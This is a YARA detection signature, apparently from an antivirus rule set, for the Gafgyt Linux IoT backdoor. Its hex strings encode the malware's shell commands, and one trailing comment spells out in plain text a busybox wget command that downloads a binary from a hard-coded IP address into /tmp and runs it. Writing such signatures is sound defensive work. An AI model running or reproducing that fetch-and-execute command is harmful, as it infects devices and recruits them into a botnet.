
rule Backdoor_Linux_Gafgyt_BB_MTB{
	meta:
		description = "Backdoor:Linux/Gafgyt.BB!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,03 00 03 00 04 00 00 "
		
	strings :
		$a_02_0 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 20 [0-03] 2e [0-03] 2e [0-03] 2e [0-03] 20 2d 6c } //1
		$a_02_1 = {2f 74 6d 70 2f [0-10] 20 2d 72 20 2f 62 69 6e 73 2f 74 65 6c 6e 65 74 2e 6d 69 70 73 } //1
		$a_02_2 = {63 68 6d 6f 64 20 37 37 37 20 2a 20 2f 74 6d 70 2f [0-10] 3b 20 2f 74 6d 70 2f [0-10] 20 68 75 61 77 65 69 } //1
		$a_00_3 = {62 75 73 79 62 6f 78 2b 77 67 65 74 2b 68 74 74 70 3a 2f 2f 33 34 2e 38 30 2e 31 33 31 2e 31 33 35 2f 62 69 6e 73 2f 74 65 6c 6e 65 74 2e 61 72 6d 2b 2d 4f 2b 2f 74 6d 70 2f 67 61 66 3b 73 68 2b 2f 74 6d 70 2f 67 61 66 2b 67 70 6f 6e 38 30 } //1 busybox+wget+http://34.80.131.135/bins/telnet.arm+-O+/tmp/gaf;sh+/tmp/gaf+gpon80
	condition:
		((#a_02_0  & 1)*1+(#a_02_1  & 1)*1+(#a_02_2  & 1)*1+(#a_00_3  & 1)*1) >=3
 
}